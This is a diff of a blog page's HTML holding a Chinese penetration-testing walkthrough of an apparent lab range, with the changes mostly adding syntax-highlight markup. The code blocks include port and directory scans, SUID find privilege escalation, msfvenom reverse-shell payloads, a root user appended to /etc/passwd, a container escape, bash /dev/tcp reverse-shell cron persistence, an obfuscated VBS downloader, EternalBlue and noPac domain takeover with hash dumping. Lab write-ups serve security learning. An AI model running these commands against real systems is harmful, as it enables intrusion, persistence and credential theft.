@@ -560,14 +560,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.2k
+                    5.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    21 分
+                    20 分
                 </div>
                 
 
@@ -612,22 +612,22 @@ remote_port &#x3D; 80<span aria-hidden="true" class="line-numbers-rows"><span></
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220402220530746.png"></p>
 <h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>先masscan扫一下看看，<code>--rate</code>可以调高以加快速度。</p>
 <p>masscan比nmap速度快但准确度低，如果什么都没扫出来可以调低速度多试几次。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan -p 1-65535 192.168.110.173  --rate&#x3D;1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan -p <span class="token number">1</span>-65535 <span class="token number">192.168</span>.110.173  --rate<span class="token operator">=</span><span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220403160639555.png"></p>
 <p>再用nmap对扫出的端口进行详细扫描。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p 80 192.168.110.173 -Pn -sV -oN result.txt
-#-Pn 目标机禁用ping，绕过ping扫描
-#-sV 对端口上的服务程序版本进行扫描
-#-oN 结果导出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p <span class="token number">80</span> <span class="token number">192.168</span>.110.173 -Pn -sV -oN result.txt
+<span class="token comment">#-Pn 目标机禁用ping，绕过ping扫描</span>
+<span class="token comment">#-sV 对端口上的服务程序版本进行扫描</span>
+<span class="token comment">#-oN 结果导出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220403164544877.png"></p>
 <p>没有太多利用的点，不过该扫还是得扫，常规操作了。</p>
 <h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>接下来就是扫下目录，找个php字典试试</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ffuf -u &quot;http:&#x2F;&#x2F;192.168.110.173&#x2F;FUZZ&quot; -w .&#x2F;dict.txt -mc 200 -fs 0 -fl 1241
-# -mc 200 筛选200状态码
-# -fs 0 排除size为0的记录
-# -fl 1241 排除line为1241的记录，主要是排除自动跳转到主页&#x2F;错误页的记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ffuf -u <span class="token string">"http://192.168.110.173/FUZZ"</span> -w ./dict.txt -mc <span class="token number">200</span> -fs <span class="token number">0</span> -fl <span class="token number">1241</span>
+<span class="token comment"># -mc 200 筛选200状态码</span>
+<span class="token comment"># -fs 0 排除size为0的记录</span>
+<span class="token comment"># -fl 1241 排除line为1241的记录，主要是排除自动跳转到主页/错误页的记录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220403215150286.png"></p>
 <p>看下robots.txt内容</p>
@@ -639,7 +639,7 @@ remote_port &#x3D; 80<span aria-hidden="true" class="line-numbers-rows"><span></
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220405191837637.png"></p>
 <h3 id="自动漏扫"><a href="#自动漏扫" class="headerlink" title="自动漏扫"></a>自动漏扫</h3><p>那接下来就是对网站进行测试了，再此之前当然得打开xray，说不定会有好事发生</p>
 <p>cmd执行：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">xray.exe webscan --listen 127.0.0.1:7777 --html-output nasa.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">xray.exe webscan --listen <span class="token number">127.0</span>.0.1:7777 --html-output nasa.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>burpsuite设置上游</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220405214152197.png"></p>
@@ -743,10 +743,10 @@ file_put_contents("&#123;$pe['path_root']&#125;config.php", $config);<span aria-
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220415200434499.png"></p>
 <p>Linux提权有很多种方式，常用的suid、sudo，脏牛等，去年还出了个脏管道(Dirty-Pipe)。</p>
 <p>先用以下命令找一下带suid的文件：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null
-find . -exec &#x2F;bin&#x2F;sh \; -quit
-find &#x2F; -user root -perm -4000-print2&gt;&#x2F;dev&#x2F;null
-find &#x2F; -user root -perm -4000-exec ls -ldb &#123;&#125; \;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token function">find</span> <span class="token builtin class-name">.</span> -exec /bin/sh <span class="token punctuation">\</span><span class="token punctuation">;</span> -quit
+<span class="token function">find</span> / -user root -perm -4000-print<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token function">find</span> / -user root -perm -4000-exec <span class="token function">ls</span> -ldb <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220415214553463.png"></p>
 <p>搜出来<code>find</code>，然后到<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E8%BF%99%E9%87%8C%E6%9F%A5%E4%B8%80%E4%B8%8B">https://gtfobins.github.io/这里查一下</a></p>
@@ -755,30 +755,30 @@ find &#x2F; -user root -perm -4000-exec ls -ldb &#123;&#125; \;<span aria-hidden
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220415214701939.png"></p>
 <p>网站给出的是完整的测试命令，平时使用只需要用第二行即可。</p>
 <p>那执行个命令试试。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find . -exec whoami \; -quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> <span class="token builtin class-name">.</span> -exec <span class="token function">whoami</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> -quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220415221528570.png"></p>
 <p>可见提权成功，接下来生成个MSF的马。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.110.131 LPORT&#x3D;6666 -f elf &gt; shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.110.131 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">6666</span> -f elf <span class="token operator">></span> shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后在kali进入<code>msfconsole</code></p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use exploit&#x2F;multi&#x2F;handler
-set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
-set lhost 192.168.110.131
-set lport 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use exploit/multi/handler
+<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp
+<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.110.131
+<span class="token builtin class-name">set</span> lport <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>再到蚁剑终端里执行shell(将点改为index.php是为了避免弹多个session)</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find index.php -exec .&#x2F;shell \; -quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> index.php -exec ./shell <span class="token punctuation">\</span><span class="token punctuation">;</span> -quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220415223140682.png"></p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220415224300619.png"></p>
 <p>提权成功了，但这种形式的root权限并不完整，最好是创建个root用户。然后就是passwd提权的思路：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">openssl passwd -1 -salt hack 123456 #生成$1$hack$.JxSX4bOP1WSqH0kCgs9Y.
-echo &#39;hack:$1$hack$.JxSX4bOP1WSqH0kCgs9Y.:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">openssl <span class="token function">passwd</span> -1 -salt hack <span class="token number">123456</span> <span class="token comment">#生成$1$hack$.JxSX4bOP1WSqH0kCgs9Y.</span>
+<span class="token builtin class-name">echo</span> <span class="token string">'hack:$1$hack$.JxSX4bOP1WSqH0kCgs9Y.:0:0:root:/root:/bin/bash'</span> <span class="token operator">>></span>/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>然后尝试切换用户，但在这里提示<code>su: must be run from a terminal</code>，说明这不是一个可交互终端。</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220416194315765.png"></p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>生成个交互终端，然后切换用户：</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220416194422322.png"></p>
@@ -793,19 +793,19 @@ echo &#39;hack:$1$hack$.JxSX4bOP1WSqH0kCgs9Y.:0:0:root:&#x2F;root:&#x2F;bin&#x2F
 </blockquote>
 <p>先<code>fdisk -l</code>看看磁盘文件名称：</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220416190824951.png"></p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkdir &#x2F;test
-mount &#x2F;dev&#x2F;sda1 &#x2F;test #将宿主机的目录挂载到test目录
-chroot &#x2F;test #改变根目录为&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkdir</span> /test
+<span class="token function">mount</span> /dev/sda1 /test <span class="token comment">#将宿主机的目录挂载到test目录</span>
+<span class="token function">chroot</span> /test <span class="token comment">#改变根目录为/test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>这样就逃逸成功了</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220421144822200.png"></p>
 <p>然后再写个反弹shell到定时任务来维持权限：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo &quot;* * * * * &#x2F;bin&#x2F;bash -c &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.110.131&#x2F;4444 0&gt;&amp;1&#39;&quot; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root
-echo &quot;* * * * * root &#x2F;bin&#x2F;bash -c &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.110.131&#x2F;4444 0&gt;&amp;1&#39;&quot; &gt;&gt; &#x2F;etc&#x2F;crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token string">"* * * * * /bin/bash -c '/bin/bash -i >&amp; /dev/tcp/192.168.110.131/4444 0>&amp;1'"</span> <span class="token operator">>></span> /var/spool/cron/crontabs/root
+<span class="token builtin class-name">echo</span> <span class="token string">"* * * * * root /bin/bash -c '/bin/bash -i >&amp; /dev/tcp/192.168.110.131/4444 0>&amp;1'"</span> <span class="token operator">>></span> /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>设定好监听端口和payload：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set lport 4444
-set payload cmd&#x2F;unix&#x2F;reverse_bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">set</span> lport <span class="token number">4444</span>
+<span class="token builtin class-name">set</span> payload cmd/unix/reverse_bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>如果一下弹太多shell容易一下开出多个session，所以定时间隔不要太短。</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220427203150311.png"></p>
@@ -827,15 +827,15 @@ set payload cmd&#x2F;unix&#x2F;reverse_bash<span aria-hidden="true" class="line-
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220429223548293.png"></p>
 <p>代理启动后就在<code>/etc/proxychains4.conf</code>中加个<code>socks5 127.0.0.1 1080</code>。</p>
 <p>然后用nmap扫一下</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">proxychains4 nmap -sS -Pn 192.168.110.0&#x2F;24 -p 445,80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">proxychains4 nmap -sS -Pn <span class="token number">192.168</span>.110.0/24 -p <span class="token number">445,80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>扫出三台机子：</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220429235741413.png"></p>
 <h3 id="iis6-0溢出"><a href="#iis6-0溢出" class="headerlink" title="iis6.0溢出"></a>iis6.0溢出</h3><p>144和197的445端口都打开了，所以第一反应肯定是掏出永恒之蓝试试。</p>
 <p>在msf中用<code>windows/smb/ms17_010_eternalblue</code>模块</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use windows&#x2F;smb&#x2F;ms17_010_eternalblue
-set pyaload windows&#x2F;meterpreter&#x2F;bind_tcp #选择正向shell
-set rhosts 192.168.110.197<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use windows/smb/ms17_010_eternalblue
+<span class="token builtin class-name">set</span> pyaload windows/meterpreter/bind_tcp <span class="token comment">#选择正向shell</span>
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.110.197<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220430115831765.png"></p>
 <p>可惜利用失败，那么就得找点其他办法。</p>
@@ -857,7 +857,7 @@ set rhosts 192.168.110.197<span aria-hidden="true" class="line-numbers-rows"><sp
 <p>github上找了个，扔msf里，成功打入。</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20220505215138924.png"></p>
 <p>后面就是老套路，写个马便于权限维持。</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;IP lport&#x3D;7777 -f exe -o s.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span>IP <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">7777</span> -f exe -o s.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>写个vbs下载脚本</p>
 <pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;download.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1009,7 +1009,7 @@ win7:1000:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::<s
 <p>反弹了个shell，成功获得权限。</p>
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20221004175628888.png"></p>
 <p>再使用该脚本hashdump一下：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">proxychains4 python noPac.py nasa.gov&#x2F;test:&#39;QWEasd!@#999&#39; -dc-ip 10.10.10.140 -dc-host AD01 --impersonate administrator -dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">proxychains4 python noPac.py nasa.gov/test:<span class="token string">'QWEasd!@#999'</span> -dc-ip <span class="token number">10.10</span>.10.140 -dc-host AD01 --impersonate administrator -dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/../images/NASA%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E9%A1%B9%E7%9B%AE%E4%B8%80/image-20221004182826142.png"></p>
 <p>使用以下命令可以只导出Administrator的哈希，在这里不能写成nasa.gov/Administrator，虽然脚本这么显示。</p>
